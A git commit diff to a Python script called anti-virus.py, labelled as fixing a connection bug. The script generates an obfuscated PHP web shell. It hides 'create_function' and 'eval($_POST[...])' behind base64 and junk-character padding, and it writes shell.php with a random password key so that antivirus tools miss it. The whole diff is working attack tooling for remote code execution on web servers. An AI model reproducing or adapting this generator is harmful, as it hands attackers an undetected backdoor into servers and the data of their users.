a9ff8ae3263d27580de2c3ec5ad29a25c242345f
Horizon <74846298+JZY-nuist@users.noreply.github.com>
2022-03-25 22:26:05 +0800

    修改了无法连接的bug

--- anti-virus.py
+++ anti-virus.py
@@ -19,14 +19,14 @@ def character_encode(replace_string, length, confusing_characters = ""):
 def free_kill():
     decode_string = character_encode("base64_decode", 50)
     replace_string = character_encode("str_replace", 50)
-    fun = character_encode(base64.b64encode("exec".encode('utf-8')).decode('utf-8'), 50)
-    ph_1 = character_encode(base64.b64encode("$_POST['".encode('utf-8')).decode('utf-8'), 50)
-    ph_2 = character_encode(base64.b64encode("'];".encode('utf-8')).decode('utf-8'), 50)
+    fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
+    ph_1 = character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50)
+    ph_2 = character_encode(base64.b64encode("']);".encode('utf-8')).decode('utf-8'), 50)
 
     keys = ''.join(random.sample(string.ascii_letters+string.digits, 4))
     # print(keys)
     
-    with open("./shell.php","w+") as f:
+    with open("C:/Users/Administrator/Desktop/shell.php","w+") as f:
         statement = f"""<?php
 $rep = str_replace("{replace_string[1]}", "", "{replace_string[0]}");
 $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
@@ -34,7 +34,9 @@ $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
 $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
 $p_2 = "{keys}";
 $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
-$func($p_1.$p_2.$p_3);
+echo $p_1.$p_2.$p_3;
+$p = $func("", $p_1.$p_2.$p_3);
+$p();
 ?>"""
         f.write(statement)
         f.close()
